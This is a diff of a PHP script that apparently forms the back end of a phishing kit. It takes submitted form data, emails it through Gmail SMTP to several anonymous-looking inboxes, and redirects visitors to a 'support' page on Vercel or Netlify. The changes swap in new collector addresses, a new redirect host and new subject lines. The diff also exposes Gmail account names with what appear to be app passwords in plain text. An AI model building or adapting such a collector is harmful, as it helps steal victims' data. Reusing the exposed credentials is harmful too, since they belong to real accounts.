@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://case-ccczqz4cd1pfr6008-support.vercel.app/");
+header("Location: https://celadon-pika-ba487e.netlify.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -27,23 +27,24 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $mail->isSMTP();
         $mail->Host       = 'smtp.gmail.com'; // Replace with your SMTP server address
         $mail->SMTPAuth   = true;
-        $mail->Username   = 'herereplit@gmail.com'; // Replace with your email address
-        $mail->Password   = 'welc oltq mcnf txvn'; // Replace with your email password
+        $mail->Username   = 'official.mitchealmartin@gmail.com'; // Replace with your email address
+        $mail->Password   = 'stbi hwua bspu vgiv'; // Replace with your email password
         $mail->SMTPSecure = 'tls';
         $mail->Port       = 587;
 
 
         // Email properties
-        $mail->setFrom('herereplit@gmail.com', 'Hello DK');
-        $mail->addAddress('teamcyber102@gmail.com');
-       $mail->addAddress('uffemail215@gmail.com');
+        $mail->setFrom('Lernayouamzaxal@gmail.com', 'Ghaliya');
+        $mail->addAddress('Lernayouamzaxal@gmail.com');
+       $mail->addAddress('Lernayouamzaxal@gmail.com');
+       $mail->addAddress('morginmocin@gmail.com');
 
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'Abid';
+        $mail->Subject = 'uzar1';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
